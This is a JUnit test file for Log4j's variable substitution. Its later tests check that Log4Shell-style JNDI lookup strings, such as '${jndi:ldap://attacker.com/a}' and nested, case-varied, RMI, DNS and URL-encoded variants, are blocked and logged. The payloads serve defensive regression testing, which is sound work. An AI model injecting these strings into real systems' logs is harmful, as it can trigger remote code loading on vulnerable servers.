/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements. See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache license, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License. You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the license for the specific language governing permissions and
 * limitations under the license.
 */
package org.apache.logging.log4j.core.lookup;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.logging.log4j.ThreadContext;
import org.apache.logging.log4j.status.StatusData;
import org.apache.logging.log4j.status.StatusLogger;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

public class StrSubstitutorTest {

    private static final String TESTKEY = "TestKey";
    private static final String TESTVAL = "TestValue";
    
    private StatusLogger statusLogger;
    private List<StatusData> statusDataList;

    @BeforeAll
    public static void before() {
        System.setProperty(TESTKEY, TESTVAL);
    }

    @AfterAll
    public static void after() {
        System.clearProperty(TESTKEY);
    }
    
    @BeforeEach
    public void setup() {
        statusLogger = StatusLogger.getLogger();
        statusDataList = statusLogger.getStatusData();
        // Clear any existing status messages before each test
        statusDataList.clear();
    }
    
    @AfterEach
    public void cleanup() {
        ThreadContext.clear();
        // Clear status messages after each test
        statusDataList.clear();
    }


    @Test
    public void testLookup() {
        final Map<String, String> map = new HashMap<>();
        map.put(TESTKEY, TESTVAL);
        final StrLookup lookup = new Interpolator(new MapLookup(map));
        final StrSubstitutor subst = new StrSubstitutor(lookup);
        ThreadContext.put(TESTKEY, TESTVAL);
        String value = subst.replace("${TestKey}-${ctx:TestKey}-${sys:TestKey}");
        assertEquals("TestValue-TestValue-TestValue", value);
        value = subst.replace("${BadKey}");
        assertEquals("${BadKey}", value);

        value = subst.replace("${BadKey:-Unknown}-${ctx:BadKey:-Unknown}-${sys:BadKey:-Unknown}");
        assertEquals("Unknown-Unknown-Unknown", value);
        value = subst.replace("${BadKey:-Unknown}-${ctx:BadKey}-${sys:BadKey:-Unknown}");
        assertEquals("Unknown-${ctx:BadKey}-Unknown", value);
        value = subst.replace("${BadKey:-Unknown}-${ctx:BadKey:-}-${sys:BadKey:-Unknown}");
        assertEquals("Unknown--Unknown", value);
    }

    @Test
    public void testDefault() {
        final Map<String, String> map = new HashMap<>();
        map.put(TESTKEY, TESTVAL);
        final StrLookup lookup = new Interpolator(new MapLookup(map));
        final StrSubstitutor subst = new StrSubstitutor(lookup);
        ThreadContext.put(TESTKEY, TESTVAL);
        //String value = subst.replace("${sys:TestKey1:-${ctx:TestKey}}");
        final String value = subst.replace("${sys:TestKey1:-${ctx:TestKey}}");
        assertEquals("TestValue", value);
    }

    // ===========================================
    // JNDI Pattern Blocking Security Tests
    // ===========================================

    @Test
    public void testJndiLdapPatternBlocking() {
        final Map<String, String> map = new HashMap<>();
        map.put(TESTKEY, TESTVAL);
        final StrLookup lookup = new Interpolator(new MapLookup(map));
        final StrSubstitutor subst = new StrSubstitutor(lookup);
        
        // Test basic JNDI LDAP pattern - should return original pattern since lookup returns null
        String value = subst.replace("${jndi:ldap://attacker.com/a}");
        assertEquals("${jndi:ldap://attacker.com/a}", value);
        
        // Verify security warning was logged
        assertSecurityWarningLogged("jndi:ldap://attacker.com/a");
    }

    @Test
    public void testJndiRmiPatternBlocking() {
        final Map<String, String> map = new HashMap<>();
        map.put(TESTKEY, TESTVAL);
        final StrLookup lookup = new Interpolator(new MapLookup(map));
        final StrSubstitutor subst = new StrSubstitutor(lookup);
        
        // Test JNDI RMI pattern blocking
        String value = subst.replace("${jndi:rmi://evil.server.com:1099/attack}");
        assertEquals("${jndi:rmi://evil.server.com:1099/attack}", value);
        
        // Verify security warning was logged
        assertSecurityWarningLogged("jndi:rmi://evil.server.com:1099/attack");
    }

    @Test
    public void testJndiDnsPatternBlocking() {
        final Map<String, String> map = new HashMap<>();
        map.put(TESTKEY, TESTVAL);
        final StrLookup lookup = new Interpolator(new MapLookup(map));
        final StrSubstitutor subst = new StrSubstitutor(lookup);
        
        // Test JNDI DNS pattern blocking
        String value = subst.replace("${jndi:dns://malicious.dns.server/exploit}");
        assertEquals("${jndi:dns://malicious.dns.server/exploit}", value);
        
        // Verify security warning was logged
        assertSecurityWarningLogged("jndi:dns://malicious.dns.server/exploit");
    }

    @Test
    public void testJndiIiopPatternBlocking() {
        final Map<String, String> map = new HashMap<>();
        map.put(TESTKEY, TESTVAL);
        final StrLookup lookup = new Interpolator(new MapLookup(map));
        final StrSubstitutor subst = new StrSubstitutor(lookup);
        
        // Test JNDI IIOP pattern blocking
        String value = subst.replace("${jndi:iiop://corba.server.com/service}");
        assertEquals("${jndi:iiop://corba.server.com/service}", value);
        
        // Verify security warning was logged
        assertSecurityWarningLogged("jndi:iiop://corba.server.com/service");
    }

    @Test
    public void testMultipleJndiPatternsBlocking() {
        final Map<String, String> map = new HashMap<>();
        map.put(TESTKEY, TESTVAL);
        final StrLookup lookup = new Interpolator(new MapLookup(map));
        final StrSubstitutor subst = new StrSubstitutor(lookup);
        
        // Test multiple JNDI patterns in single string
        String input = "User: ${ctx:username} accessed ${jndi:ldap://attacker.com/payload} with token ${jndi:rmi://evil.com/token}";
        String value = subst.replace(input);
        
        // JNDI patterns should remain unchanged, other patterns should be processed
        String expected = "User: ${ctx:username} accessed ${jndi:ldap://attacker.com/payload} with token ${jndi:rmi://evil.com/token}";
        assertEquals(expected, value);
        
        // Verify both security warnings were logged
        assertSecurityWarningLogged("jndi:ldap://attacker.com/payload");
        assertSecurityWarningLogged("jndi:rmi://evil.com/token");
    }

    @Test
    public void testNestedJndiPatternBlocking() {
        final Map<String, String> map = new HashMap<>();
        map.put("lower", "jndi");
        map.put(TESTKEY, TESTVAL);
        final StrLookup lookup = new Interpolator(new MapLookup(map));
        final StrSubstitutor subst = new StrSubstitutor(lookup);
        
        // Test nested JNDI pattern: ${${lower:jndi}:ldap://attacker.com/payload}
        // This should resolve ${lower:jndi} to "jndi" first, then try ${jndi:ldap://...}
        String value = subst.replace("${${lower}:ldap://attacker.com/nested}");
        assertEquals("${jndi:ldap://attacker.com/nested}", value);
        
        // Verify security warning was logged for the resolved JNDI pattern
        assertSecurityWarningLogged("jndi:ldap://attacker.com/nested");
    }

    @Test
    public void testJndiPatternWithDefaultValueBlocking() {
        final Map<String, String> map = new HashMap<>();
        map.put(TESTKEY, TESTVAL);
        final StrLookup lookup = new Interpolator(new MapLookup(map));
        final StrSubstitutor subst = new StrSubstitutor(lookup);
        
        // Test JNDI pattern with default value - should still be blocked
        String value = subst.replace("${jndi:ldap://attacker.com/exploit:-defaultValue}");
        assertEquals("${jndi:ldap://attacker.com/exploit:-defaultValue}", value);
        
        // Verify security warning was logged
        assertSecurityWarningLogged("jndi:ldap://attacker.com/exploit:-defaultValue");
    }

    @Test
    public void testJndiPatternCaseInsensitiveBlocking() {
        final Map<String, String> map = new HashMap<>();
        map.put(TESTKEY, TESTVAL);
        final StrLookup lookup = new Interpolator(new MapLookup(map));
        final StrSubstitutor subst = new StrSubstitutor(lookup);
        
        // Test case variations of JNDI patterns
        String value1 = subst.replace("${JNDI:ldap://attacker.com/payload}");
        String value2 = subst.replace("${Jndi:ldap://attacker.com/payload}");
        String value3 = subst.replace("${jNdI:ldap://attacker.com/payload}");
        
        // All should be blocked (assuming Interpolator handles case-insensitivity)
        assertEquals("${JNDI:ldap://attacker.com/payload}", value1);
        assertEquals("${Jndi:ldap://attacker.com/payload}", value2);
        assertEquals("${jNdI:ldap://attacker.com/payload}", value3);
    }

    @Test
    public void testJndiPatternInComplexExpression() {
        final Map<String, String> map = new HashMap<>();
        map.put("prefix", "data");
        map.put("suffix", "end");
        map.put(TESTKEY, TESTVAL);
        final StrLookup lookup = new Interpolator(new MapLookup(map));
        final StrSubstitutor subst = new StrSubstitutor(lookup);
        
        // Test JNDI pattern mixed with valid patterns
        String input = "${prefix}-${jndi:ldap://malicious.com/attack}-${suffix}";
        String value = subst.replace(input);
        
        // Valid patterns should resolve, JNDI should remain blocked
        assertEquals("data-${jndi:ldap://malicious.com/attack}-end", value);
        
        // Verify security warning was logged
        assertSecurityWarningLogged("jndi:ldap://malicious.com/attack");
    }

    @Test
    public void testJndiPatternWithUrlEncodedContent() {
        final Map<String, String> map = new HashMap<>();
        map.put(TESTKEY, TESTVAL);
        final StrLookup lookup = new Interpolator(new MapLookup(map));
        final StrSubstitutor subst = new StrSubstitutor(lookup);
        
        // Test JNDI pattern with URL-encoded malicious content
        String value = subst.replace("${jndi:ldap://attacker.com/cn%3DExploit%2Cdc%3Dmalicious%2Cdc%3Dcom}");
        assertEquals("${jndi:ldap://attacker.com/cn%3DExploit%2Cdc%3Dmalicious%2Cdc%3Dcom}", value);
        
        // Verify security warning was logged
        assertSecurityWarningLogged("jndi:ldap://attacker.com/cn%3DExploit%2Cdc%3Dmalicious%2Cdc%3Dcom");
    }

    @Test
    public void testJndiPatternWithSpecialCharacters() {
        final Map<String, String> map = new HashMap<>();
        map.put(TESTKEY, TESTVAL);
        final StrLookup lookup = new Interpolator(new MapLookup(map));
        final StrSubstitutor subst = new StrSubstitutor(lookup);
        
        // Test JNDI patterns with various special characters
        String[] patterns = {
            "${jndi:ldap://evil.com/cn=test,ou=users,dc=evil,dc=com}",
            "${jndi:rmi://192.168.1.100:1099/attack}",
            "${jndi:ldap://attacker.com:1389/exploit?param=value}",
            "${jndi:dns://malicious.example.com/_ldap._tcp/exploit}"
        };
        
        for (String pattern : patterns) {
            String value = subst.replace(pattern);
            assertEquals(pattern, value, "Pattern should remain unchanged: " + pattern);
        }
        
        // Verify all security warnings were logged
        for (String pattern : patterns) {
            String variableName = pattern.substring(2, pattern.length() - 1); // Remove ${ and }
            assertSecurityWarningLogged(variableName);
        }
    }

    @Test
    public void testNonJndiPatternsNotAffected() {
        final Map<String, String> map = new HashMap<>();
        map.put("jndi_safe", "safe_value");
        map.put("not_jndi", "another_value");
        map.put(TESTKEY, TESTVAL);
        final StrLookup lookup = new Interpolator(new MapLookup(map));
        final StrSubstitutor subst = new StrSubstitutor(lookup);
        ThreadContext.put("user", "testuser");
        
        // Test that non-JNDI patterns work normally
        String value1 = subst.replace("${sys:" + TESTKEY + "}");
        String value2 = subst.replace("${ctx:user}");
        String value3 = subst.replace("${jndi_safe}");
        String value4 = subst.replace("${not_jndi}");
        
        assertEquals(TESTVAL, value1);
        assertEquals("testuser", value2);
        assertEquals("safe_value", value3);
        assertEquals("another_value", value4);
        
        // Verify no security warnings were logged for non-JNDI patterns
        assertNoSecurityWarnings();
    }

    @Test
    public void testEmptyJndiPatternBlocking() {
        final Map<String, String> map = new HashMap<>();
        map.put(TESTKEY, TESTVAL);
        final StrLookup lookup = new Interpolator(new MapLookup(map));
        final StrSubstitutor subst = new StrSubstitutor(lookup);
        
        // Test empty JNDI pattern
        String value = subst.replace("${jndi:}");
        assertEquals("${jndi:}", value);
        
        // Verify security warning was logged
        assertSecurityWarningLogged("jndi:");
    }

    @Test
    public void testJndiPatternWithWhitespace() {
        final Map<String, String> map = new HashMap<>();
        map.put(TESTKEY, TESTVAL);
        final StrLookup lookup = new Interpolator(new MapLookup(map));
        final StrSubstitutor subst = new StrSubstitutor(lookup);
        
        // Test JNDI pattern with whitespace (if supported by pattern matching)
        String value = subst.replace("${jndi: ldap://attacker.com/payload }");
        assertEquals("${jndi: ldap://attacker.com/payload }", value);
        
        // Verify security warning was logged
        assertSecurityWarningLogged("jndi: ldap://attacker.com/payload ");
    }

    // ===========================================
    // Helper Methods for Test Assertions
    // ===========================================

    /**
     * Asserts that a security warning was logged for the specified JNDI variable name.
     * 
     * @param expectedVariableName the variable name that should appear in the security warning
     */
    private void assertSecurityWarningLogged(String expectedVariableName) {
        boolean warningFound = false;
        String expectedMessageFragment = "Blocked JNDI variable substitution attempt for security";
        
        for (StatusData statusData : statusDataList) {
            String message = statusData.getMessage().getFormattedMessage();
            if (message.contains(expectedMessageFragment) && message.contains(expectedVariableName)) {
                warningFound = true;
                assertEquals("WARN", statusData.getLevel().name(), 
                    "Security warning should be logged at WARN level");
                break;
            }
        }
        
        assertTrue(warningFound, 
            "Expected security warning for JNDI variable '" + expectedVariableName + "' was not found in status logs. " +
            "Logged messages: " + getLoggedMessages());
    }
    
    /**
     * Asserts that no security warnings were logged.
     */
    private void assertNoSecurityWarnings() {
        String securityWarningFragment = "Blocked JNDI variable substitution attempt for security";
        
        for (StatusData statusData : statusDataList) {
            String message = statusData.getMessage().getFormattedMessage();
            assertFalse(message.contains(securityWarningFragment), 
                "Unexpected security warning found: " + message);
        }
    }
    
    /**
     * Helper method to get all logged messages for debugging.
     * 
     * @return formatted string of all logged messages
     */
    private String getLoggedMessages() {
        StringBuilder sb = new StringBuilder();
        for (StatusData statusData : statusDataList) {
            sb.append("[").append(statusData.getLevel()).append("] ")
              .append(statusData.getMessage().getFormattedMessage())
              .append("\n");
        }
        return sb.toString();
    }
}
